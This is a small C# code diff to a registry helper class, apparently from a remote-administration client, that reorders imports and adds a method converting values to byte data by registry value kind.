@@ -1,9 +1,10 @@
-﻿using System;
-using System.Linq;
-using Microsoft.Win32;
-using xClient.Core.Extensions;
-using System.Collections.Generic;
+﻿using Microsoft.Win32;
 using Quasar.Common.Models;
+using Quasar.Common.Utilities;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using xClient.Core.Extensions;
 
 namespace xClient.Core.Helper
 {
@@ -114,12 +115,44 @@ namespace xClient.Core.Helper
         /// <returns>A array with the default registry values</returns>
         public static RegValueData[] GetDefaultValues()
         {
-            return new RegValueData[] { GetDefaultValue() };
+            return new[] {GetDefaultValue()};
+        }
+
+        public static RegValueData CreateRegValueData(string name, RegistryValueKind kind, object value = null)
+        {
+            var newRegValue = new RegValueData {Name = name, Kind = kind};
+
+            if (value == null)
+                newRegValue.Data = new byte[] { };
+            else
+            {
+                switch (newRegValue.Kind)
+                {
+                    case RegistryValueKind.Binary:
+                        newRegValue.Data = (byte[]) value;
+                        break;
+                    case RegistryValueKind.MultiString:
+                        newRegValue.Data = ByteConverter.GetBytes((string[]) value);
+                        break;
+                    case RegistryValueKind.DWord:
+                        newRegValue.Data = ByteConverter.GetBytes((uint) (int) value);
+                        break;
+                    case RegistryValueKind.QWord:
+                        newRegValue.Data = ByteConverter.GetBytes((ulong) (long) value);
+                        break;
+                    case RegistryValueKind.String:
+                    case RegistryValueKind.ExpandString:
+                        newRegValue.Data = ByteConverter.GetBytes((string) value);
+                        break;
+                }
+            }
+
+            return newRegValue;
         }
 
         private static RegValueData GetDefaultValue()
         {
-            return new RegValueData {Name = DEFAULT_VALUE, Kind = RegistryValueKind.String, Data = null};
+            return CreateRegValueData(DEFAULT_VALUE, RegistryValueKind.String);
         }
     }
 }
